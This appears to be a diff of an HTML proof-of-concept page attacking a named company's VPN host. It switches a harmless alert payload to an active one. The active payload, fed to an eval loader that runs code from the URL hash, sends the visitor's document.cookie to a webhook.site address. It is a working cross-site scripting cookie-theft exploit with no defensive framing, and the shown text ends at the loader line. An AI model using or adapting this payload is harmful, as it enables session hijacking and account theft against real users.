@@ -3,8 +3,8 @@
     <script type="module">
       var BASE_URL = "https://newvpn.sidefx.com";
 
-      const payload_to_execute = btoa(`alert(document.domain);`);
-      //const payload_to_execute = btoa(`window.location.href = "https://webhook.site/fb19b42f-27b2-438d-854b-846691a18991?cookie=" + btoa(document.cookie);`);
+      //const payload_to_execute = btoa(`alert(document.domain);`);
+      const payload_to_execute = btoa(`window.location.href = "https://webhook.site/b40966d2-af59-4546-85fc-5b461d4092ee?cookie=" + btoa(document.cookie);`);
 
       var loader = btoa(
         '(async () => {await eval(atob(location.hash.slice(1).split("#")[0]));})()'
